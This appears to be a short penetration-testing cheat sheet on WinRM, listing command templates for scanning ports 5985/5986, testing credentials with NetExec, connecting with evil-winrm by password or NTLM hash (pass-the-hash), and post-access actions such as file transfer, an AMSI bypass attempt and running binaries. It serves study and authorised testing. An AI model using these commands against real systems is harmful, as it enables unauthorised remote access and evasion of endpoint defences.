---
tags: [basics, protocol, winrm]
---


> [!info] See also: [[Evil-Winrm]]



## General Notes 
- Network protocol based on XML web services using SOAP (Simple Object Access Protocol)
- Default Port is: 5985 (HTTP) and 5986 (HTTPS)

## Attacking the Protocol

```bash
# Footprinting - check if WinRM is open
nmap -p 5985,5986 <ip>

# Test credentials with NetExec
netexec winrm <ip> -u <user> -p <password>

# Connect with evil-winrm (Linux)
evil-winrm -i <ip> -u <user> -p <password>

# Connect with credentials hash (pass-the-hash)
evil-winrm -i <ip> -u <user> -H <NTLM-hash>

# Connect with SSL (port 5986)
evil-winrm -i <ip> -u <user> -p <password> -S

# Run a command without interactive shell
evil-winrm -i <ip> -u <user> -p <password> -c 'whoami'
```

## Useful evil-winrm commands (once connected)

```powershell
upload /local/path/file.exe C:\remote\path\file.exe
download C:\remote\file.txt /local/path/file.txt
menu        # show available modules
Bypass-4MSI # attempt AMSI bypass
Invoke-Binary /local/path/binary.exe
```